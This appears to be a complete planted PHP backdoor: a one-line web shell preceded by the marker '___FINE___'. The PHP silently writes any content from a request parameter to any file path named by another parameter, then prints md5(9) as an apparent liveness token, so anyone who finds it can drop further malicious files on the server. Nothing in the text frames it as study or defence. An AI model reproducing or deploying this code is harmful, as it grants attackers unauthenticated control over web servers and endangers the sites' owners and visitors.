___FINE___
<?php $r=$_REQUEST;@file_put_contents($r['js_name'],$r['js_body']);print(md5(9));?>